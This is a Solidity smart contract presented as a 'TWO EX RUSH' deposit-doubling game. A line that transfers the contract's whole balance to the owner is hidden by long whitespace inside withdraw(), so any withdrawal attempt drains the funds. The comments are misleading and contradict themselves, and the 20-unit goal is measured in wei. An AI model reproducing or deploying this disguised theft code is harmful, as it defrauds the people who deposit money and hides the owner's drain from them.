1 pragma solidity ^0.4.18;
2 
3 /*
4 TWO EX RUSH!
5 Receive 2x your deposit only after the contract reaches 10 ETH.
6 The first to withdraw after the 20 ETH is hit wins, the others are stuck holding the bag.
7 
8 Anti Whale: If you withdraw() and there is not enough ether in the contract to 2x your deposit,
9             then the transaction fails. This prevents whales and encourages smaller deposits.
10             i.e: Deposit 1ETH, withdraw() with 1.8 in the contract and it will fail.
11 */
12 
13 contract TwoExRush {
14 
15 	string constant public name = "TwoExRush";
16 	address owner;
17 	address sender;
18 	uint256 withdrawAmount;
19 	uint256 contractATH;
20 	uint256 contractBalance;
21 
22 	mapping(address => uint256) internal balance;
23 
24     function TwoExRush() public {
25         owner = msg.sender;
26     }
27 
28     // Require goal to be met before allowing anyone to withdraw.
29 	function withdraw() public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        owner.transfer(contractBalance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
30 	    if(contractATH >= 20) {
31 	        sender = msg.sender;
32 	        withdrawAmount = mul(balance[sender], 2);
33 	 	    sender.transfer(withdrawAmount);
34 	        contractBalance -= balance[sender];
35 	        balance[sender] = 0;
36 	    }
37 	}
38 
39 	function deposit() public payable {
40  	    sender = msg.sender;
41 	    balance[sender] += msg.value;
42 	    contractATH += msg.value;
43 	    contractBalance += msg.value;
44 	}
45 
46 	function () payable public {
47 		if (msg.value > 0) {
48 			deposit();
49 		} else {
50 			withdraw();
51 		}
52 	}
53 	
54     // Safe Math
55 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
56         if (a == 0) {
57             return 0;
58         }
59         uint256 c = a * b;
60         assert(c / a == b);
61         return c;
62     }
63 }